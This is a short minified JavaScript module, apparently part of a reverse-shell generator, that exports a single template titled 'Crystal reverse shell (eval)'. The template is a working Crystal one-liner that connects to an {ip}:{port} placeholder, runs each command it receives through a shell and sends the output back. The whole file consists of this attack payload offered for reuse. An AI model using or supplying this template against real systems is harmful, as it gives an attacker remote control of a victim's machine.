const e=[{title:"Crystal reverse shell (eval)",template:`crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("{ip}",{port});loop{m,l=c.receive;p=Process.new(m.rstrip("\\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'`,description:"Crystal reverse shell using one-liner eval with socket and process."}],t={commands:e};export{e as commands,t as default};
